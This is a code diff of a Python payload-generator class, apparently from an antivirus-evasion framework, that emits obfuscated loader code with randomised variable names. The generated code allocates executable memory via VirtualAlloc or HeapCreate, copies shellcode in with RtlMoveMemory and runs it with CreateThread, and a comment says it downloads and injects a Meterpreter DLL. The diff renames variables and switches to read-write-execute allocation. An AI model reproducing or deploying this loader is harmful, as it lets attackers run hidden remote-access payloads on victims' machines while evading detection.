@@ -65,15 +65,14 @@ class PayloadModule:
 
         injectMethodName = evasion_helpers.randomString()
         dataName = evasion_helpers.randomString()
-        ShellcodeVariableName = evasion_helpers.randomString()
-        rand_ptr = evasion_helpers.randomString()
+        byteArrayName = evasion_helpers.randomString()
+        ptrName = evasion_helpers.randomString()
         bufName = evasion_helpers.randomString()
-        rand_ht = evasion_helpers.randomString()
+        handleName = evasion_helpers.randomString()
         data2Name = evasion_helpers.randomString()
         proxy_var = evasion_helpers.randomString()
         opener_var = evasion_helpers.randomString()
         randctypes = evasion_helpers.randomString()
-        rand_virtual_protect = evasion_helpers.randomString()
 
         payload_code = "import urllib.request, string, random, ctypes as " + randctypes + "\n"
 
@@ -112,25 +111,25 @@ class PayloadModule:
         # method to inject a reflective .dll into memory
         payload_code += '\t' * num_tabs_required + "def " + injectMethodName + "(" + dataName + "):\n"
         payload_code += '\t' * num_tabs_required + "\tif " + dataName + " != \"\":\n"
-        payload_code += '\t' * num_tabs_required + "\t\t" + ShellcodeVariableName + " = bytearray(" + dataName + ")\n"
+        payload_code += '\t' * num_tabs_required + "\t\t" + byteArrayName + " = bytearray(" + dataName + ")\n"
 
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
-            payload_code += '\t' * num_tabs_required + "\t\t" + rand_ptr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ ShellcodeVariableName +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x04))\n'
-            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + rand_ptr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
-            payload_code += '\t' * num_tabs_required + "\t\t" + rand_virtual_protect + ' = ' + randctypes + '.windll.kernel32.VirtualProtect(' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')),' + randctypes + '.c_int(0x20),' + randctypes + '.byref(' + randctypes + '.c_uint32(0)))\n'
-            payload_code += '\t' * num_tabs_required + "\t\t" + rand_ht + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
-            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + rand_ht + '),' + randctypes + '.c_int(-1))\n'
+            payload_code += '\t' * num_tabs_required + "\t\t" + ptrName + " = " + randctypes + ".windll.kernel32.VirtualAlloc(" + randctypes + ".c_int(0)," + randctypes + ".c_int(len(" + byteArrayName + ")), " + randctypes + ".c_int(0x3000)," + randctypes + ".c_int(0x40))\n"
+            payload_code += '\t' * num_tabs_required + "\t\t" + bufName + " = (" + randctypes + ".c_char * len(" + byteArrayName + ")).from_buffer(" + byteArrayName + ")\n"
+            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + ".windll.kernel32.RtlMoveMemory(" + randctypes + ".c_int(" + ptrName + ")," + bufName + ", " + randctypes + ".c_int(len(" + byteArrayName + ")))\n"
+            payload_code += '\t' * num_tabs_required + "\t\t" + handleName + " = " + randctypes + ".windll.kernel32.CreateThread(" + randctypes + ".c_int(0)," + randctypes + ".c_int(0)," + randctypes + ".c_int(" + ptrName + ")," + randctypes + ".c_int(0)," + randctypes + ".c_int(0)," + randctypes + ".pointer(" + randctypes + ".c_int(0)))\n"
+            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + ".windll.kernel32.WaitForSingleObject(" + randctypes + ".c_int(" + handleName + ")," + randctypes + ".c_int(-1))\n"
 
         # Assuming heap injection
         else:
             HeapVar = evasion_helpers.randomString()
 
-            payload_code += '\t' * num_tabs_required + "\t\t" + HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ') * 2),' + randctypes + '.c_int(0))\n'
-            payload_code += '\t' * num_tabs_required + "\t\t" + rand_ptr + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + ShellcodeVariableName + ')))\n'
-            payload_code += '\t' * num_tabs_required + "\t\t" + bufName + ' = (' + randctypes + '.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
-            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + rand_ptr + '),' + bufName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
-            payload_code += '\t' * num_tabs_required + "\t\t" + rand_ht + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
-            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + rand_ht + '),' + randctypes + '.c_int(-1))\n'
+            payload_code += '\t' * num_tabs_required + "\t\t" + HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + byteArrayName + ') * 2),' + randctypes + '.c_int(0))\n'
+            payload_code += '\t' * num_tabs_required + "\t\t" + ptrName + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + byteArrayName + ')))\n'
+            payload_code += '\t' * num_tabs_required + "\t\t" + bufName + ' = (' + randctypes + '.c_char * len(' + byteArrayName + ')).from_buffer(' + byteArrayName + ')\n'
+            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + ptrName + '),' + bufName + ',' + randctypes + '.c_int(len(' + byteArrayName + ')))\n'
+            payload_code += '\t' * num_tabs_required + "\t\t" + handleName + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + ptrName + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
+            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + handleName + '),' + randctypes + '.c_int(-1))\n'
 
         # download the metpreter .dll and inject it
         payload_code += '\t' * num_tabs_required + data2Name + " = ''\n"
